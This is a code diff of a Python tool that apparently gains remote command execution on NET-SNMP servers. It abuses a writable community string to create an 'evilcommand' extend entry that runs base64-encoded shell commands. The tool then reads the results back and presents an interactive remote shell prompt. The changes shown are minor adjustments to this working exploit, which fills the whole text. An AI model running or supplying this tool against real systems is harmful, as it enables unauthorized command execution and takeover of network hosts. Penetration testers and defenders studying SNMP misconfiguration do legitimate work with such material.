@@ -43,7 +43,7 @@ def run(ip, communitystring, version, snmpset, snmpwalk):
 	def process(cmd):
 		cmd = base64.b64encode(cmd.encode()).decode()
 		os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"' = destroy > /dev/null""".format(snmpset, version, com_str, ip))
-		os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"'  = createAndGo 'nsExtendCommand."evilcommand"' = /bin/bash 'nsExtendArgs."evilcommand"' = "-c \\\"echo {} | base64 -d | sh\\\"" > /dev/null""".format(snmpset, version, com_str, ip, cmd))
+		os.system("""{} -m +NET-SNMP-EXTEND-MIB -v {} -c {} {} 'nsExtendStatus."evilcommand"'  = createAndGo 'nsExtendCommand."evilcommand"' = /bin/sh 'nsExtendArgs."evilcommand"' = "-c \\\"echo {} | base64 -d | sh\\\"" > /dev/null""".format(snmpset, version, com_str, ip, cmd))
 		output = os.system("""{} -v {} -c {} {} NET-SNMP-EXTEND-MIB::nsExtendOutputFull > /tmp/snmprce""".format(snmpwalk, version, com_str, ip))
 
 		with open('/tmp/snmprce', 'r') as file:
@@ -62,7 +62,8 @@ def run(ip, communitystring, version, snmpset, snmpwalk):
 			return final
 
 	try:
-		output = process("echo -n ]LEDEBUT]$(whoami)[$(hostname)[$(pwd)]LAFIN]")
+		output = process("echo -n ]LEDEBUT]$(whoami)[$(echo $HOSTNAME)[$(pwd)]LAFIN]")
+		print(output)
 		prefixes = re.compile(reg).findall(output)[0].split("[")
 		path = prefixes[2]
 		prefix = colored(prefixes[0] + "@" + prefixes[1], "red") + ":" + colored(prefixes[2], "cyan") + "$ "
@@ -70,14 +71,13 @@ def run(ip, communitystring, version, snmpset, snmpwalk):
 	except IndexError:
 			print("Error.\nBe sure your SNMP Community String has write access & your NET-SNMP target has \"extend\" functionality.")
 			exit()
-			
 	try:
 		while 1:
 			text = input(prefix)
 			if not text.strip():
 				continue
 			cmd = text.strip()
-			cmd = "echo -n ']LEDEBUT]' ; cd {} && ".format(path) + cmd + " 2>&1 ; echo $(whoami)[$(hostname)[$(pwd) ; echo ']LAFIN]'"
+			cmd = "echo -n ']LEDEBUT]' ; cd {} && ".format(path) + cmd + " 2>&1 ; echo $(whoami)[$(echo $HOSTNAME)[$(pwd) ; echo ']LAFIN]'"
 			output = process(cmd)
 			try:
 				output = re.compile(reg).findall(output)[0].split('\n')
